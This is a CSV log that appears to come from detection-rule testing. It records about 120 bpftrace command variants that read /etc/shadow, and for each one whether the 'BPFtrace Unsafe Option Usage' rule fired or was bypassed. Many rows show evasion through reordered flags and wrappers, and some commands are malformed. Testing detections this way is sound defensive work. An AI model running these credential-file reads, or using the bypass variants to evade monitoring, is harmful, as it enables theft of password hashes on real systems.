ID,Command,Log File,Result,All Detected Rules
129,"/usr/bin/bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack129.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
130,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack130.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
131,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack131.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
132,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack132.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
133,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack133.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
134,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack134.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
135,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack135.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
136,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack136.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
137,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack137.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
138,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack138.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
139,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack139.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
140,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack140.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
141,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack141.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
142,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack142.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
143,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack143.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
144,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack144.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
145,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack145.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
146,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack146.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
147,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack147.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
148,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack148.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
149,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack149.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
150,"./bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack150.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
151,"env PATH=/usr/bin bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack151.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
152,"/usr/local/bin/bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack152.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
153,"sudo env bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack153.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
154,"command bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack154.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
155,"setsid bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack155.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
156,"nohup bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack156.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Nohup Execution
157,"bash -lc 'bpftrace -e ""BEGIN { cat(\""/etc/shadow\""); exit(); }""'",BPFtrace_Unsafe_Option_Usage_attack157.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
158,"sh -c 'bpftrace -e ""BEGIN { cat(\""/etc/shadow\""); exit(); }""'",BPFtrace_Unsafe_Option_Usage_attack158.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
159,"/bin/bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack159.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
160,"sudo /bin/bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack160.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
161,"env -i PATH=/usr/bin bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack161.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
162,"sudo -E bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack162.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
163,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }' < /dev/null",BPFtrace_Unsafe_Option_Usage_attack163.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
164,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }' 2>/dev/null",BPFtrace_Unsafe_Option_Usage_attack164.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
165,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }' 1>/tmp/out.txt",BPFtrace_Unsafe_Option_Usage_attack165.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
166,"env BPFTRACE_STRLEN=64 bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack166.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
167,"sudo env BPFTRACE_STRLEN=64 bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack167.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
168,"bpftrace -e 'BEGIN { system(""cat /etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack168.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
169,"sudo bpftrace -e 'BEGIN { system(""cat /etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack169.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
170,"bpftrace -e 'BEGIN { print(cat(""/etc/shadow"")); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack170.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
171,"bpftrace -e 'BEGIN { printf(""%s"", cat(""/etc/shadow"")); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack171.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
172,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); }'",BPFtrace_Unsafe_Option_Usage_attack172.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
173,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); sleep(0); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack173.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
174,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); END { exit(); } }'",BPFtrace_Unsafe_Option_Usage_attack174.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
175,"sudo bash -c 'bpftrace -e ""BEGIN { cat(\""/etc/shadow\""); exit(); }""'",BPFtrace_Unsafe_Option_Usage_attack175.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
176,"env SHELL=/bin/bash bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack176.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
177,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(0); }'",BPFtrace_Unsafe_Option_Usage_attack177.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
178,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(1); }'",BPFtrace_Unsafe_Option_Usage_attack178.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
179,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); return; }'",BPFtrace_Unsafe_Option_Usage_attack179.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
180,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); } END { exit(); }'",BPFtrace_Unsafe_Option_Usage_attack180.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
181,"sudo --unsafe bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack181.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
182,"sudo -e 'BEGIN { cat(""/etc/shadow""); exit(); }' bpftrace --unsafe",BPFtrace_Unsafe_Option_Usage_attack182.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
183,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }' --unsafe sudo",BPFtrace_Unsafe_Option_Usage_attack183.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
184,"-unsafe sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack184.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
185,"bpftrace --unsafe sudo -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack185.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
186,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }' --unsafe",BPFtrace_Unsafe_Option_Usage_attack186.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
187,"e 'BEGIN { cat(""/etc/shadow""); exit(); }' sudo bpftrace --unsafe",BPFtrace_Unsafe_Option_Usage_attack187.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
188,"sudo bpftrace --unsafe -e 'exit(); BEGIN { cat(""/etc/shadow""); }'",BPFtrace_Unsafe_Option_Usage_attack188.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
189,"sudo bpftrace --unsafe -e 'cat(""/etc/shadow""); BEGIN { exit(); }'",BPFtrace_Unsafe_Option_Usage_attack189.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
190,"sudo bpftrace -e 'BEGIN { exit(); cat(""/etc/shadow""); }' --unsafe",BPFtrace_Unsafe_Option_Usage_attack190.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
191,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); } exit();' --unsafe",BPFtrace_Unsafe_Option_Usage_attack191.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
192,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }' --unsafe",BPFtrace_Unsafe_Option_Usage_attack192.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
193,"bpftrace sudo --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack193.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
194,"-unsafe bpftrace sudo -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack194.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
195,"sudo --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }' bpftrace",BPFtrace_Unsafe_Option_Usage_attack195.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
196,bpftrace -e 'BEGIN { exit(); }' sudo --unsafe,BPFtrace_Unsafe_Option_Usage_attack196.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
197,"sudo -e 'BEGIN { cat(""/etc/shadow""); exit(); }' --unsafe bpftrace",BPFtrace_Unsafe_Option_Usage_attack197.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
198,"sudo -e 'BEGIN { exit(); cat(""/etc/shadow""); }' bpftrace --unsafe",BPFtrace_Unsafe_Option_Usage_attack198.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
199,"sudo -e 'BEGIN { cat(""/etc/shadow""); exit(); }' bpftrace --unsafe",BPFtrace_Unsafe_Option_Usage_attack199.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
200,"sudo bpftrace -e 'exit(); BEGIN { cat(""/etc/shadow""); }' --unsafe",BPFtrace_Unsafe_Option_Usage_attack200.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
201,"sudo --unsafe bpftrace -e 'exit(); BEGIN { cat(""/etc/shadow""); }'",BPFtrace_Unsafe_Option_Usage_attack201.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
202,"-unsafe sudo -e 'BEGIN { cat(""/etc/shadow""); exit(); }' bpftrace",BPFtrace_Unsafe_Option_Usage_attack202.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
203,"bpftrace --unsafe -e 'exit(); BEGIN { cat(""/etc/shadow""); }' sudo",BPFtrace_Unsafe_Option_Usage_attack203.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
204,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); }' --unsafe exit();",BPFtrace_Unsafe_Option_Usage_attack204.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
205,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }' sudo --unsafe",BPFtrace_Unsafe_Option_Usage_attack205.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
206,"sudo bpftrace --unsafe -e 'BEGIN { exit(); cat(""/etc/shadow""); }'",BPFtrace_Unsafe_Option_Usage_attack206.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
207,"sudo -e 'exit(); BEGIN { cat(""/etc/shadow""); }' bpftrace --unsafe",BPFtrace_Unsafe_Option_Usage_attack207.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
208,"e 'BEGIN { exit(); cat(""/etc/shadow""); }' bpftrace sudo --unsafe",BPFtrace_Unsafe_Option_Usage_attack208.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
209,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }' --unsafe sudo",BPFtrace_Unsafe_Option_Usage_attack209.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
210,"sudo bpftrace --unsafe -e 'BEGIN { exit(); } cat(""/etc/shadow"");'",BPFtrace_Unsafe_Option_Usage_attack210.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
211,"-unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }' sudo bpftrace",BPFtrace_Unsafe_Option_Usage_attack211.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
212,"e 'BEGIN { cat(""/etc/shadow""); exit(); }' --unsafe bpftrace sudo",BPFtrace_Unsafe_Option_Usage_attack212.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
213,"bpftrace sudo -e 'BEGIN { cat(""/etc/shadow""); exit(); }' --unsafe",BPFtrace_Unsafe_Option_Usage_attack213.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
214,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }' sudo --unsafe",BPFtrace_Unsafe_Option_Usage_attack214.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
215,"sudo --unsafe -e 'exit(); BEGIN { cat(""/etc/shadow""); }' bpftrace",BPFtrace_Unsafe_Option_Usage_attack215.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
216,"sudo -e 'BEGIN { cat(""/etc/shadow""); }' bpftrace --unsafe exit();",BPFtrace_Unsafe_Option_Usage_attack216.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
217,"e 'BEGIN { cat(""/etc/shadow""); exit(); }' bpftrace sudo --unsafe",BPFtrace_Unsafe_Option_Usage_attack217.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
218,sudo bpftrace -e 'BEGIN { exit(); }' --unsafe; cat /etc/shadow,BPFtrace_Unsafe_Option_Usage_attack218.log,Trigger: BPFtrace Unsafe Option Usage,Local System Accounts Discovery - Linux | BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
219,"sudo bpftrace -e 'BEGIN { system(""cat /etc/shadow""); exit(); }' --unsafe",BPFtrace_Unsafe_Option_Usage_attack219.log,Trigger: BPFtrace Unsafe Option Usage,Local System Accounts Discovery - Linux | BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
220,"sudo bpftrace --unsafe -e 'BEGIN { system(""cat /etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack220.log,Trigger: BPFtrace Unsafe Option Usage,Local System Accounts Discovery - Linux | BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
221,"-unsafe bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }' sudo",BPFtrace_Unsafe_Option_Usage_attack221.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
222,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }' --unsafe; sudo",BPFtrace_Unsafe_Option_Usage_attack222.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
223,sudo bpftrace --unsafe -e 'BEGIN { exit(); }'; cat /etc/shadow,BPFtrace_Unsafe_Option_Usage_attack223.log,Trigger: BPFtrace Unsafe Option Usage,Local System Accounts Discovery - Linux | BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
224,"bpftrace --unsafe sudo -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack224.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
225,"sudo bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }' --unsafe",BPFtrace_Unsafe_Option_Usage_attack225.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
226,sudo bpftrace -e 'BEGIN { exit(); }' --unsafe; cat /etc/shadow,BPFtrace_Unsafe_Option_Usage_attack226.log,Trigger: BPFtrace Unsafe Option Usage,Local System Accounts Discovery - Linux | BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
227,"bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); } exit();' sudo",BPFtrace_Unsafe_Option_Usage_attack227.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
228,"sudo -e 'BEGIN { exit(); cat(""/etc/shadow""); }' --unsafe bpftrace",BPFtrace_Unsafe_Option_Usage_attack228.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
229,"e 'BEGIN { exit(); cat(""/etc/shadow""); }' --unsafe sudo bpftrace",BPFtrace_Unsafe_Option_Usage_attack229.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
230,"-unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }' bpftrace sudo",BPFtrace_Unsafe_Option_Usage_attack230.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
231,"bpftrace sudo --unsafe -e 'BEGIN { exit(); cat(""/etc/shadow""); }'",BPFtrace_Unsafe_Option_Usage_attack231.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
232,"bpftrace -e 'BEGIN { cat(""/etc/shadow""); exit(); }' sudo --unsafe",BPFtrace_Unsafe_Option_Usage_attack232.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
233,"sudo bpftrace --unsafe -e 'exit(); BEGIN { system(""cat /etc/shadow""); }'",BPFtrace_Unsafe_Option_Usage_attack233.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
234,"sudo -e 'BEGIN { cat(""/etc/shadow""); exit(); }' --unsafe bpftrace",BPFtrace_Unsafe_Option_Usage_attack234.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
235,bpftrace -e 'BEGIN { exit(); }' --unsafe sudo; cat /etc/shadow,BPFtrace_Unsafe_Option_Usage_attack235.log,Trigger: BPFtrace Unsafe Option Usage,Local System Accounts Discovery - Linux | BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
236,-unsafe sudo bpftrace -e 'BEGIN { exit(); }'; cat /etc/shadow,BPFtrace_Unsafe_Option_Usage_attack236.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
237,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }'",BPFtrace_Unsafe_Option_Usage_attack237.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
238,"sudo -e 'BEGIN { system(""cat /etc/shadow""); exit(); }' bpftrace --unsafe",BPFtrace_Unsafe_Option_Usage_attack238.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
239,"sudo --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); }' bpftrace",BPFtrace_Unsafe_Option_Usage_attack239.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
240,"e 'BEGIN { cat(""/etc/shadow""); exit(); }' sudo bpftrace --unsafe",BPFtrace_Unsafe_Option_Usage_attack240.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
241,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=2130706433'",BPFtrace_Unsafe_Option_Usage_attack241.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
242,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x7f000001'",BPFtrace_Unsafe_Option_Usage_attack242.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
243,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=017700000001'",BPFtrace_Unsafe_Option_Usage_attack243.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
244,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.1'",BPFtrace_Unsafe_Option_Usage_attack244.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
245,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.0.1'",BPFtrace_Unsafe_Option_Usage_attack245.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
246,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.0.0.0x1'",BPFtrace_Unsafe_Option_Usage_attack246.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
247,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x7f.0.0.1'",BPFtrace_Unsafe_Option_Usage_attack247.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
248,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.0.0000.0001'",BPFtrace_Unsafe_Option_Usage_attack248.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
249,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0177.0.0.1'",BPFtrace_Unsafe_Option_Usage_attack249.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
250,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=127.000.000.001'",BPFtrace_Unsafe_Option_Usage_attack250.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
251,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x7f000001'",BPFtrace_Unsafe_Option_Usage_attack251.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
252,"sudo bpftrace --unsafe -e 'BEGIN { cat(""/etc/shadow""); exit(); } # address=0x7f.0x0.0x0.0x1'",BPFtrace_Unsafe_Option_Usage_attack252.log,Trigger: BPFtrace Unsafe Option Usage,BPFtrace Unsafe Option Usage | Syslog Clearing or Removal Via System Utilities
